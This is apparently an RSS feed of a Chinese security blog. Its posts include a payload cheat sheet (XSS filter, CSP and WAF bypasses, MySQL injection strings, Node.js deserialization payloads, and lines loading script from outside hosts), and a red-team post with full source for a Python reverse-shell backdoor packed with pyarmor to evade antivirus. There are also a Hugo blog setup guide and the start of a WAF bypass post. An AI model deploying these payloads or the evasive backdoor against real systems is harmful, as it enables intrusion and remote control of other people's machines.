<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
	<channel>
		<title>Posts on Liod &#39;s Blog</title>
		<link>/posts/</link>
		<description>Recent content in Posts on Liod &#39;s Blog</description>
		<generator>Hugo -- gohugo.io</generator>
		<language>zh-cn</language>
		<copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright>
		<lastBuildDate>Thu, 25 Apr 2019 21:15:41 +0800</lastBuildDate>
		<atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
		
		<item>
			<title>Payload记录</title>
			<link>/posts/payload%E8%AE%B0%E5%BD%95/</link>
			<pubDate>Thu, 25 Apr 2019 21:15:41 +0800</pubDate>
			
			<guid>/posts/payload%E8%AE%B0%E5%BD%95/</guid>
			<description>记录一些用得到payload xss &amp;gt; 标签黑名单类 &amp;lt;svg%0Ao%00nload=%09((pro\u006dpt))()// &amp;lt;script x&amp;gt;alert(&amp;#39;XSS&amp;#39;)&amp;lt;script y&amp;gt; &amp;gt; 关键字bypass eval(&amp;#39;ale&amp;#39;+&amp;#39;rt(0)&amp;#39;); Function(&amp;#34;ale&amp;#34;+&amp;#34;rt(1)&amp;#34;)(); new Function`al\ert\`6\``; setTimeout(&amp;#39;ale&amp;#39;+&amp;#39;rt(2)&amp;#39;); setInterval(&amp;#39;ale&amp;#39;+&amp;#39;rt(10)&amp;#39;); Set.constructor(&amp;#39;ale&amp;#39;+&amp;#39;rt(13)&amp;#39;)(); Set.constructor`al\x65rt\x2814\x29```; &amp;gt; csp-bypass &amp;lt;script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);&amp;gt;&amp;#34; script=document.createElement(&amp;#39;script&amp;#39;); script.src=&amp;#39;//bo0om.ru/csp.js&amp;#39;; window.frames[0].document.head.appendChild(script); d=document;f=d.createElement(&amp;#34;iframe&amp;#34;);f.src=d.querySelector(&amp;#39;link[href*=&amp;#34;.css&amp;#34;]&amp;#39;).href;d.body.append(f);s=d.createElement(&amp;#34;script&amp;#34;);s.src=&amp;#34;https://yoursubdomain.xss.ht&amp;#34;;setTimeout(function(){f.contentWindow.document.head.append(s);},1000) &amp;lt;object data=&amp;#34;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&amp;#34;&amp;gt;&amp;lt;/object&amp;gt; &amp;gt; waf-bypass &amp;lt;dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x&amp;gt; &amp;lt;a href=javas&amp;amp;#99;ript:alert(1)&amp;gt; &amp;lt;object data=&amp;#39;data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&amp;#39;&amp;gt;&amp;lt;/object&amp;gt; ?&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;base%20c%3D=href%3Dhttps:\mysite&amp;gt; 来源: PayloadsAllTheThings
SQL注入 mysql &amp;gt; union union select id from user where id = &amp;#39;1&amp;#39; and 0x01 union /*!60000*/select 1,2,3 from `mysql0.user` bool SELECT * FROM users WHERE id=&amp;#39;1&amp;#39;=/*!user () regexp 0x5e72*/ -- +  bool SELECT * FROM users WHERE id=&amp;#39;1&amp;#39; and sleep/**/((select @a:=if(user/**/() regexp /*!</description>
			<content type="html"><![CDATA[

<h1 id="记录一些用得到payload">记录一些用得到payload</h1>

<h2 id="xss">xss</h2>

<h3 id="标签黑名单类">&gt; 标签黑名单类</h3>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">svg</span><span class="err">%</span><span class="na">0Ao</span><span class="err">%</span><span class="na">00nload</span><span class="o">=</span><span class="s">%09((pro\u006dpt))()//</span>
<span class="err">&lt;</span><span class="na">script</span> <span class="na">x</span><span class="p">&gt;</span>alert(&#39;XSS&#39;)<span class="p">&lt;</span><span class="nt">script</span> <span class="na">y</span><span class="p">&gt;</span></code></pre></div>
<h3 id="关键字bypass">&gt; 关键字bypass</h3>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html">eval(&#39;ale&#39;+&#39;rt(0)&#39;);
Function(&#34;ale&#34;+&#34;rt(1)&#34;)();
new Function`al\ert\`6\``;
setTimeout(&#39;ale&#39;+&#39;rt(2)&#39;);
setInterval(&#39;ale&#39;+&#39;rt(10)&#39;);
Set.constructor(&#39;ale&#39;+&#39;rt(13)&#39;)();
Set.constructor`al\x65rt\x2814\x29```;</code></pre></div>
<h3 id="csp-bypass">&gt; csp-bypass</h3>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">script</span><span class="err">/</span><span class="na">src</span><span class="o">=</span><span class="s">//google.com/complete/search?client=chrome%26jsonp=alert(1);</span><span class="p">&gt;</span><span class="err">&#34;
</span><span class="err">
</span><span class="err">script=document.createElement(&#39;script&#39;);
</span><span class="err">script.src=&#39;//bo0om.ru/csp.js&#39;;
</span><span class="err">window.frames[0].document.head.appendChild(script);
</span><span class="err">
</span><span class="err">
</span><span class="err">d=document;f=d.createElement(&#34;iframe&#34;);f.src=d.querySelector(&#39;link[href*=&#34;.css&#34;]&#39;).href;d.body.append(f);s=d.createElement(&#34;script&#34;);s.src=&#34;https://yoursubdomain.xss.ht&#34;;setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
</span><span class="err">
</span><span class="err">
</span><span class="err">&lt;object data=&#34;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&#34;&gt;&lt;/object&gt;</span></code></pre></div>
<h3 id="waf-bypass">&gt; waf-bypass</h3>
<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">dETAILS</span><span class="err">%</span><span class="na">0aopen</span><span class="err">%</span><span class="na">0aonToGgle</span><span class="err">%</span><span class="na">0a</span><span class="o">=</span><span class="s">%0aa=prompt,a()</span> <span class="na">x</span><span class="p">&gt;</span>

<span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">javas&amp;#99;ript:alert(1)</span><span class="p">&gt;</span>

<span class="p">&lt;</span><span class="nt">object</span> <span class="na">data</span><span class="o">=</span><span class="s">&#39;data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&#39;</span><span class="p">&gt;&lt;/</span><span class="nt">object</span><span class="p">&gt;</span>

?&#34;&gt;<span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;</span><span class="nt">base</span><span class="err">%</span><span class="na">20c</span><span class="err">%</span><span class="na">3D</span><span class="o">=</span><span class="s">href%3Dhttps:\mysite</span><span class="p">&gt;</span></code></pre></div>
<p>来源: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#polyglot-xss">PayloadsAllTheThings</a></p>

<h2 id="sql注入">SQL注入</h2>

<h3 id="mysql">mysql</h3>

<h4 id="union">&gt; union</h4>
<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="k">union</span> 
<span class="k">select</span> <span class="n">id</span> <span class="k">from</span> <span class="k">user</span> <span class="k">where</span> <span class="n">id</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span> <span class="k">and</span> <span class="mi">0</span><span class="n">x01</span> <span class="k">union</span> <span class="cm">/*!60000*/</span><span class="k">select</span> <span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span> <span class="k">from</span> <span class="o">`</span><span class="n">mysql0</span><span class="p">.</span><span class="k">user</span><span class="o">`</span>

<span class="n">bool</span>  
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">id</span><span class="o">=</span><span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="cm">/*!user () regexp 0x5e72*/</span> <span class="c1">-- +
</span><span class="c1"></span>
<span class="n">bool</span> 
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">users</span> <span class="k">WHERE</span> <span class="n">id</span><span class="o">=</span><span class="s1">&#39;1&#39;</span> <span class="k">and</span> <span class="n">sleep</span><span class="cm">/**/</span><span class="p">((</span><span class="k">select</span> <span class="o">@</span><span class="n">a</span><span class="p">:</span><span class="o">=</span><span class="k">if</span><span class="p">(</span><span class="k">user</span><span class="cm">/**/</span><span class="p">()</span> <span class="n">regexp</span> <span class="cm">/*!&#39;a&#39;*/</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">)))</span></code></pre></div>
<h2 id="反序列化">反序列化</h2>

<h3 id="nodejs">nodejs</h3>

<pre><code>{&quot;anything_here&quot;:&quot;_$$ND_FUNC$$_function (){сonsole.log(1)}&quot;}

{ __js_function: 'function testa(){var pr = this.constructor.constructor(&quot;return process&quot;)(); pr.stdout.write(&quot;param-pam-pam&quot;) }()' }

{&quot;root&quot;:&quot;_CRYO_REF_1&quot;,&quot;references&quot;:[{&quot;contents&quot;:{},&quot;value&quot;:&quot;_CRYO_FUNCTION_function () {return 1111;}&quot;},{&quot;contents&quot;:{&quot;testFunc&quot;:&quot;_CRYO_REF_0&quot;},&quot;value&quot;:&quot;_CRYO_OBJECT_&quot;}]}

{&quot;root&quot;:&quot;CRYO_REF_3&quot;,&quot;references&quot;:[{&quot;contents&quot;:{},&quot;value&quot;:&quot;_CRYO_FUNCTION_function () {console.log(\&quot;defconrussia\&quot;); return 1111;}&quot;},{&quot;contents&quot;:{},&quot;value&quot;:&quot;_CRYO_FUNCTION_function () {return 2222;}&quot;},{&quot;contents&quot;:{&quot;toString&quot;:&quot;_CRYO_REF_0&quot;,&quot;valueOf&quot;:&quot;_CRYO_REF_1&quot;},&quot;value&quot;:&quot;_CRYO_OBJECT&quot;},{&quot;contents&quot;:{&quot;proto&quot;:&quot;CRYO_REF_2&quot;},&quot;value&quot;:&quot;_CRYO_OBJECT&quot;}]}
</code></pre>

<p>来源: <a href="https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/?tdsourcetag=s_pctim_aiomsg">https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/?tdsourcetag=s_pctim_aiomsg</a></p>
]]></content>
		</item>
		
		<item>
			<title>Hugo&#43;github_pages搭建博客</title>
			<link>/posts/hugo&#43;github_pages%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</link>
			<pubDate>Thu, 25 Apr 2019 16:26:40 +0800</pubDate>
			
			<guid>/posts/hugo&#43;github_pages%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</guid>
			<description>前言  Hugo是由Go语言实现的静态网站生成器。简单、易用、高效、易扩展、快速部署。
 官网 The world’s fastest framework for building websites | Hugo
相比hexo而言，hugo确实很方便的部署静态网站。而且 too go！ too faster！
安装 在对应系统平台下载安装包 Releases · gohugoio/hugo · GitHub
# 生成站点 $ hugo new site /path/to/site $ cd /path/to/site 目录结构如下 ▸ archetypes/ ▸ content/ ▸ layouts/ ▸ static/ config.toml #创建文章 $ hugo new about.md #创建文章放到post目录 $ hugo new post/first.md #安装主题 # 创建 themes 目录 $ cd themes $ git clone https://github.com/spf13/hyde.git $ hugo server --theme=hyde --buildDrafts 浏览器里打开： http://localhost:1313</description>
			<content type="html"><![CDATA[

<h1 id="前言">前言</h1>

<hr />

<blockquote>
<p>Hugo是由Go语言实现的静态网站生成器。简单、易用、高效、易扩展、快速部署。</p>
</blockquote>

<p>官网 <a href="https://gohugo.io/">The world’s fastest framework for building websites | Hugo</a></p>

<p>相比hexo而言，hugo确实很方便的部署静态网站。而且 too go！ too faster！</p>

<h1 id="安装">安装</h1>

<hr />

<p>在对应系统平台下载安装包 <a href="https://github.com/gohugoio/hugo/releases">Releases · gohugoio/hugo · GitHub</a></p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 生成站点</span>
$ hugo new site /path/to/site
$ <span class="nb">cd</span> /path/to/site
目录结构如下
  ▸ archetypes/
  ▸ content/
  ▸ layouts/
  ▸ static/
    config.toml
<span class="c1">#创建文章</span>
$ hugo new about.md
<span class="c1">#创建文章放到post目录</span>
$ hugo new post/first.md
<span class="c1">#安装主题</span>
<span class="c1"># 创建 themes 目录</span>
$ <span class="nb">cd</span> themes
$ git clone https://github.com/spf13/hyde.git
$ hugo server --theme<span class="o">=</span>hyde --buildDrafts</code></pre></div>
<p>浏览器里打开： <a href="http://localhost:1313">http://localhost:1313</a></p>

<p><img src="https://image.3001.net/images/20190425/15561807293998.png" alt="836284c6.png" /></p>

<h1 id="github-pages-部署">github pages 部署</h1>

<hr />

<p>注册自己用户名的github.io，然后本地建立分支，然后 进入hugo站点public目录为github pages 静态文件，这里官方有脚本，但是自己windwos使用自己写了一个bat文件使用更新</p>

<p><a href="https://gohugo.io/hosting-and-deployment/hosting-on-github/">Host on GitHub | Hugo</a></p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">@echo off

rem github 远程同步脚本

@ <span class="nb">cd</span> %~dp0../

<span class="nb">echo</span> 更新本地节点
@ hugo -D

@ <span class="nb">cd</span> %~dp0

@ git add .

<span class="nb">set</span> <span class="nv">THISDATETIME</span><span class="o">=</span>%DATE:~0,4%%DATE:~5,2%%DATE:~8,2%%TIME:~0,2%%TIME:~3,2%%TIME:~6,2%
<span class="nb">echo</span>  %THISDATETIME%

@ git commit -m %THISDATETIME%

<span class="nb">set</span> <span class="nv">result</span><span class="o">=</span>%ERRORLEVEL%

<span class="nb">echo</span> %0 <span class="p">|</span> findstr <span class="s2">&#34;^nothing to commit&#34;</span> &gt; null
<span class="k">if</span> %errorlevel% equ <span class="m">0</span> <span class="o">(</span>
<span class="nb">echo</span> 文件未有改动
<span class="o">)</span> <span class="k">else</span> <span class="o">(</span>
@ git push -f origin master

<span class="nb">echo</span> 更新完成
<span class="o">)</span></code></pre></div>]]></content>
		</item>
		
		<item>
			<title>有趣的python混淆</title>
			<link>/posts/%E6%9C%89%E8%B6%A3%E7%9A%84python%E6%B7%B7%E6%B7%86/</link>
			<pubDate>Thu, 25 Oct 2018 17:06:13 +0800</pubDate>
			
			<guid>/posts/%E6%9C%89%E8%B6%A3%E7%9A%84python%E6%B7%B7%E6%B7%86/</guid>
			<description>一个有趣的python混淆库 pyarmor · PyPI 前几天由于红队要准备一些东西，找不到免杀的远控，一时也没有思路，想到以前有人用shellcode&amp;lt;python&amp;gt; 打包为exe，可以免杀的效果，但是常规shellcode直接打包已经被列入规则库，我想了想从python语言角度上混淆看来下效果，基本常见免杀引擎都可以，满足需求。
pyarmor打包混淆原理，其收费版本混淆无规则，开源免费版本硬编码。 Pyarmor 加密和保护 Python 源代码的方法和机制 pyarmor/protect-python-scripts-by-pyarmor.md at master · dashingsoft/pyarmor · GitHub
准备工作 一个python tcp服务端和客户端，利用混淆库 打包成windwos exe。
server.py (tcp后门例子用的是t00ls的帖子) # -*- coding: utf-8 -*- import socket,subprocess as sp,sys # 导入subprocess，socket模块 # 1）监听信息 host = sys.argv[1] # 攻击者地址，通常留空&amp;#39;&amp;#39; port = int(sys.argv[2]) # 攻击者主机端口 # 2）套接字部分 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # 安装套接字 s.bind((host,port)) # 绑定套接字 s.listen(100) # 最大连接数:100 conn,addr = s.accept() # 接收客户端连接 # 3）输出连接信息 print &amp;#34;[+] Conection Established from: %s&amp;#34; % (str(addr[0])) # 打印攻击者的连接信息 # 4）接收输出 while 1: # 运行死循环初始化反向的连接 command = raw_input(&amp;#34;#&amp;gt; &amp;#34;) # 服务器输入 # 5）if判断-1 if command !</description>
			<content type="html"><![CDATA[

<h1 id="一个有趣的python混淆库">一个有趣的python混淆库</h1>

<h2 id="pyarmor-pypi-https-pypi-org-project-pyarmor"><a href="https://pypi.org/project/pyarmor/">pyarmor · PyPI</a></h2>

<p>前几天由于红队要准备一些东西，找不到免杀的远控，一时也没有思路，想到以前有人用shellcode<code>&lt;python&gt;</code> 打包为<code>exe</code>，可以免杀的效果，但是常规shellcode直接打包已经被列入规则库，我想了想从python语言角度上混淆看来下效果，基本常见免杀引擎都可以，满足需求。</p>

<p><code>pyarmor</code>打包混淆原理，其收费版本混淆无规则，开源免费版本硬编码。
Pyarmor 加密和保护 Python 源代码的方法和机制 <a href="https://github.com/dashingsoft/pyarmor/blob/master/docs/zh-cn/protect-python-scripts-by-pyarmor.md">pyarmor/protect-python-scripts-by-pyarmor.md at master · dashingsoft/pyarmor · GitHub</a></p>

<h2 id="准备工作">准备工作</h2>

<p>一个python tcp服务端和客户端，利用混淆库 打包成windwos exe。</p>

<h3 id="server-py-tcp后门例子用的是t00ls的帖子">server.py (tcp后门例子用的是t00ls的帖子)</h3>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># -*- coding: utf-8 -*-</span>
<span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span><span class="nn">subprocess</span> <span class="kn">as</span> <span class="nn">sp</span><span class="o">,</span><span class="nn">sys</span>                    <span class="c1"># 导入subprocess，socket模块</span>

<span class="c1"># 1）监听信息</span>
<span class="n">host</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>                                   <span class="c1"># 攻击者地址，通常留空&#39;&#39;</span>
<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>                              <span class="c1"># 攻击者主机端口</span>

<span class="c1"># 2）套接字部分</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="c1"># 安装套接字</span>
<span class="n">s</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>                                  <span class="c1"># 绑定套接字</span>
<span class="n">s</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>                                        <span class="c1"># 最大连接数:100</span>
<span class="n">conn</span><span class="p">,</span><span class="n">addr</span>  <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>                              <span class="c1"># 接收客户端连接</span>

<span class="c1"># 3）输出连接信息</span>
<span class="k">print</span> <span class="s2">&#34;[+] Conection Established from: </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">addr</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
                                                     <span class="c1"># 打印攻击者的连接信息</span>
<span class="c1"># 4）接收输出</span>
<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>                                            <span class="c1"># 运行死循环初始化反向的连接</span>
    <span class="n">command</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s2">&#34;#&gt; &#34;</span><span class="p">)</span>                      <span class="c1"># 服务器输入</span>
    <span class="c1"># 5）if判断-1</span>
    <span class="k">if</span> <span class="n">command</span> <span class="o">!=</span> <span class="s2">&#34;exit()&#34;</span><span class="p">:</span>                         <span class="c1"># 如果命令不是exit()，那就继续执行</span>
        <span class="c1"># 6）if判断-2</span>
        <span class="k">if</span> <span class="n">command</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span><span class="p">:</span> <span class="k">continue</span>                  <span class="c1"># 命令如果为空，循环这个函数</span>
        <span class="c1"># 7）发送、接收命令</span>
        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>                          <span class="c1"># 发送命令到客户端</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>                    <span class="c1"># 接收并输出</span>
        <span class="c1"># 8） 处理接收结果</span>
        <span class="n">total_size</span> <span class="o">=</span> <span class="nb">long</span><span class="p">(</span><span class="n">result</span><span class="p">[:</span><span class="mi">16</span><span class="p">])</span>              <span class="c1"># 获取返回数据的大小,取出前16位的值</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="mi">16</span><span class="p">:]</span>                        <span class="c1"># 接收数据的结果，取16位之后的值</span>
        <span class="c1"># 9） 处理数据</span>
        <span class="k">while</span> <span class="n">total_size</span> <span class="o">&gt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">):</span>             <span class="c1"># 循环函数</span>
            <span class="n">data</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>                  <span class="c1"># 每次接收1024的数据，如果发送的数据大于现在接收的数据</span>
            <span class="n">result</span> <span class="o">+=</span> <span class="n">data</span>                          <span class="c1"># 循环接收并且拼接起来</span>
        <span class="c1"># 10）打印结果过滤换行符</span>
        <span class="k">print</span> <span class="n">result</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>                   <span class="c1"># 过滤掉换行符</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;exit()&#34;</span><span class="p">)</span>                         <span class="c1"># 发送客户端关闭的消息</span>
        <span class="k">print</span> <span class="s2">&#34;[+] shell Going Down&#34;</span>                <span class="c1"># 本地退出提示</span>
        <span class="k">break</span>
<span class="c1"># 11）出现任何故障关闭套接字</span>
<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span> </code></pre></div>
<h3 id="agent-py">agent.py</h3>
<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span><span class="nn">subprocess</span> <span class="kn">as</span> <span class="nn">sp</span><span class="o">,</span><span class="nn">sys</span>                    


<span class="n">host</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>                                   
<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>                          


<span class="n">conn</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> 
<span class="n">conn</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>

<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
    <span class="n">command</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">))</span>

    <span class="k">if</span> <span class="n">command</span> <span class="o">!=</span> <span class="s2">&#34;exit()&#34;</span><span class="p">:</span>
        <span class="n">sh</span> <span class="o">=</span> <span class="n">sp</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">command</span><span class="p">,</span><span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span>
                      <span class="n">stdout</span><span class="o">=</span><span class="n">sp</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span>
                      <span class="n">stderr</span><span class="o">=</span><span class="n">sp</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span>
                      <span class="n">stdin</span><span class="o">=</span><span class="n">sp</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span>

        <span class="n">out</span><span class="p">,</span><span class="n">err</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">communicate</span><span class="p">()</span>   

        <span class="n">result</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">out</span><span class="p">)</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>

        <span class="n">length</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">))</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>

        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">length</span> <span class="o">+</span> <span class="n">result</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">break</span>


<span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span></code></pre></div>
<h3 id="pyarmor-打包exe">pyarmor 打包exe</h3>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">pyarmor pack -t PyInstaller project/src/agent.py</code></pre></div>
<blockquote>
<p>常规情况是直接打包为一个exe文件加一些别的dll库文件，而我们正常渗透是不可能上传这些东西上去的，因此分析了下代码，修改pyarmor某处代码，这样打包生成一个文件。
pyinstaller 打包成一个文件的原理也不是直接所有打包，他运行时需要释放一个缓存目录，运行程序，因此部分测试时生成的exe文件第一次运行没有成功的也是这个原因。</p>
</blockquote>

<h3 id="免杀效果">免杀效果</h3>

<p>在测试的情况下，尝试使用webshell和正常运行均没有影响，且常见杀毒引擎也是不会拦截的
<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/78989ac9.png" alt="78989ac9.png" /></p>

<p>webshell运行情况：
<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/6c7318da.png" alt="6c7318da.png" /></p>

<p>杀毒引擎查杀情况（<code>这个IKARUS正常python输出helloworld文件也爆，可能对这种混淆方式做了一些处理</code>）：
<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/ef0f6c18.png" alt="ef0f6c18.png" /></p>

<h3 id="使用">使用</h3>

<blockquote>
<p>修改pyarmor库某处代码 类似<code>/usr/local/lib/python3.7/site-packages/pyarmor/packer.py</code>  187行 修改为</p>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nv">options</span> <span class="o">=</span> <span class="o">[</span><span class="s1">&#39;-F&#39;</span>, <span class="s1">&#39;-y&#39;</span>, <span class="s1">&#39;--specpath&#39;</span>, project<span class="o">]</span></code></pre></div>
<p><img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/ddcb3a6e.png" alt="ddcb3a6e.png" /></p>
</blockquote>
<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">pyarmor pack -t PyInstaller project/src/agent.py

更多使用方法：</code></pre></div>
<p><a href="https://github.com/dashingsoft/pyarmor/blob/master/src/examples/README-ZH.md">pyarmor/README-ZH.md at master · dashingsoft/pyarmor · GitHub</a></p>

<h2 id="引用">引用</h2>

<p><a href="https://www.t00ls.net/articles-43337.html">https://www.t00ls.net/articles-43337.html</a></p>
]]></content>
		</item>
		
		<item>
			<title>Post With Featured Image</title>
			<link>/posts/post-with-featured-image/</link>
			<pubDate>Mon, 01 Oct 2018 16:15:09 +0800</pubDate>
			
			<guid>/posts/post-with-featured-image/</guid>
			<description>Just define the image URL in the content’s front matter, the featured image will be displayed as the background.
For example:
---images:-https://picsum.photos/1024/768/?random--- This is an array, you can set multiple urls, only the first url will be used. These images is also used in Twitter Cards and the Open Graph metadata.</description>
			<content type="html"><![CDATA[<p>Just define the image URL in the content’s front matter, the featured image will be displayed as the background.</p>

<p>For example:</p>
<div class="highlight"><pre class="chroma"><code class="language-yaml" data-lang="yaml">---<span class="w">
</span><span class="w"></span>images<span class="p">:</span><span class="w">
</span><span class="w">  </span>-<span class="w"> </span>https<span class="p">:</span>//picsum.photos/<span class="m">1024</span>/<span class="m">768</span>/<span class="p">?</span>random<span class="w">
</span><span class="w"></span>---</code></pre></div>
<p>This is an array, you can set multiple urls, only the first url will be used. These images is also used in <a href="https://developer.twitter.com/en/docs/tweets/optimize-with-cards/guides/getting-started.html">Twitter Cards</a> and the <a href="http://ogp.me/">Open Graph</a> metadata.</p>
]]></content>
		</item>
		
		<item>
			<title>安全狗bypass</title>
			<link>/posts/%E5%AE%89%E5%85%A8%E7%8B%97/</link>
			<pubDate>Mon, 25 Jun 2018 14:05:01 +0800</pubDate>
			
			<guid>/posts/%E5%AE%89%E5%85%A8%E7%8B%97/</guid>
			<description>前言 最近在学习waf的绕过,中间遇到不同的坑,后来学习下sqlmap中tamper的写法,膜拜sqlmap的作者, tamper的写法很丰富,也很方便
安全狗的绕过 自己本地搭建了最新版本的安全狗,利用mysql的内联注释,继续bypass
环境准备  PHP 5.4.5 Mysql 5.5 Apache 2.2.0  利用替换空白字符&amp;quot; &amp;quot; == &amp;quot;/**!50000xxx**/&amp;quot;的方法 bypass
注入源码 show.php
